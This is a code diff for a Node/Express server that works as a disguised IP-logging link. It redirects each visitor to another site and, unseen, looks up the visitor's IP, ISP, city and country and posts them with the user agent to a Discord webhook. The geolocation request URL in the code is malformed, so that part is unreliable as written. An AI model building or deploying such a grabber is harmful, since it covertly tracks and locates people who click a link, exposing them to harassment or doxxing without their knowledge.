@@ -1,12 +1,32 @@
+// Changed to ES Module imports to match what Render is expecting
+import express from 'express';
+
+const app = express(); 
+
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK; 
+const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 
+
+app.get('/', async (req, res) => { 
+    res.redirect(302, REDIRECT_URL);
+
+    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || ''; 
+    let clientIp = rawIp.replace(/,.*$/, '').trim(); 
+
+    if (clientIp.includes('::ffff:')) { 
+        clientIp = clientIp.replace('::ffff:', ''); 
+    } 
+
+    if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') { 
+        clientIp = '8.8.8.8'; 
+    } 
+
+    const userAgent = req.headers['user-agent'] || 'Unknown'; 
+
     if (DISCORD_WEBHOOK_URL) {
-        // Safe, non-blocking background task
         try { 
-            // Switched to ipwho.is: Fast, open, supports secure HTTPS, and cloud-friendly
             const geoResponse = await fetch(`https://ipwho.is{clientIp}`); 
             const geoData = await geoResponse.json(); 
 
-            // Map data layout from ipwho.is response
-            // If the IP is invalid or local, it responds with success: false safely
             const ispName = geoData.connection?.isp || "Unknown ISP"; 
             const cityName = geoData.city || "Unknown City"; 
             const countryName = geoData.country || "Unknown Country"; 
@@ -27,14 +47,18 @@
                 }] 
             }; 
 
-            // Send the payload to Discord
             await fetch(DISCORD_WEBHOOK_URL, { 
                 method: 'POST', 
                 headers: { 'Content-Type': 'application/json' }, 
                 body: JSON.stringify(discordPayload) 
             }); 
         } catch (error) { 
-            // Logs the explicit error stack trace to your console if it ever drops
             console.error("Background Logger Failed gracefully:", error); 
         } 
     } 
+}); 
+
+const PORT = process.env.PORT || 10000; 
+app.listen(PORT, () => { 
+    console.log(`Server running on port ${PORT}`); 
+});
